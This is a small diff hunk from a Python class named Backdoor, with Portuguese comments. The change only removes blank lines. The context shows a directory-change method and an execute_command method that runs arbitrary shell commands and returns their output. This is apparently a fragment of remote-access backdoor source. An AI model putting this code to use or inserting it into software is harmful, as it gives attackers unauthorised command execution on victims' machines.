@@ -22,8 +22,6 @@ class Backdoor:
         os.chdir(path)
         new_directory = os.getcwd()
         return f"[+] Mudança para {new_directory}"
-
-
     def execute_command(self, command):
         return (subprocess.check_output(command, shell=True)).decode('utf-8', errors = "ignore") # O comando retorna um tipo byte, por isso é necessário decodificar para string
 
